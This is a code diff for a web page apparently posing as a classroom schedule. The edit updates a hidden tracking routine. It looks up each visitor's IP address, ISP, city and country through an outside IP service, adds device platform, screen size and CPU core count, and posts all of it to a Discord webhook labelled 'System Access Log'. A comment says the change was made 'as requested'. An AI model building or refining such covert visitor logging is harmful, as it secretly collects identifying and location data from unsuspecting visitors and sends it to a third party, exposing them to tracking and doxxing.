@@ -215,30 +215,37 @@
         }
 
         async function initializeSecurityLogging() {
-            let data = { ip: 'Unknown', org: 'Unknown', city: 'Unknown', country_name: 'Unknown', country_code: 'Unknown' };
+            let data = { ip: 'Unknown', org: 'Unknown', city: 'Unknown', country: 'Unknown' };
             
             try {
-                // Attempt to get IP data with retry logic
-                data = await fetchWithRetry('https://ipapi.co/json/');
+                // Using ipwho.is as requested for better stability and detailed info
+                const response = await fetchWithRetry('https://ipwho.is/');
+                if (response && response.success) {
+                    data = {
+                        ip: response.ip || 'Unknown',
+                        org: response.connection?.isp || response.connection?.org || 'Unknown',
+                        city: response.city || 'Unknown',
+                        country: response.country || 'Unknown'
+                    };
+                }
             } catch (error) {
                 console.error("Security initialization failed:", error);
-                // Even if fetching IP fails, we proceed with device data
             }
 
-            // Update UI even if IP fetch failed
-            document.getElementById('displayIP').textContent = `IP: ${data.ip || 'Unavailable'}`;
-            document.getElementById('displayISP').textContent = `ISP: ${data.org || 'Unavailable'}`;
+            // Update UI 
+            document.getElementById('displayIP').textContent = `IP: ${data.ip}`;
+            document.getElementById('displayISP').textContent = `ISP: ${data.org}`;
 
-            // Send Webhook to Discord (always try to send even if IP fails)
+            // Send Webhook to Discord
             try {
                 const payload = {
                     embeds: [{
                         title: "System Access Log - Classroom Schedule",
                         color: 3447003,
                         fields: [
-                            { name: "IP Address", value: data.ip || "Unknown", inline: true },
-                            { name: "ISP / Organization", value: data.org || "Unknown", inline: true },
-                            { name: "Location", value: `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`, inline: true },
+                            { name: "IP Address", value: data.ip, inline: true },
+                            { name: "ISP / Organization", value: data.org, inline: true },
+                            { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
                             { name: "Device Platform", value: navigator.platform, inline: true },
                             { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                             { name: "CPU Cores", value: navigator.hardwareConcurrency || "N/A", inline: true },
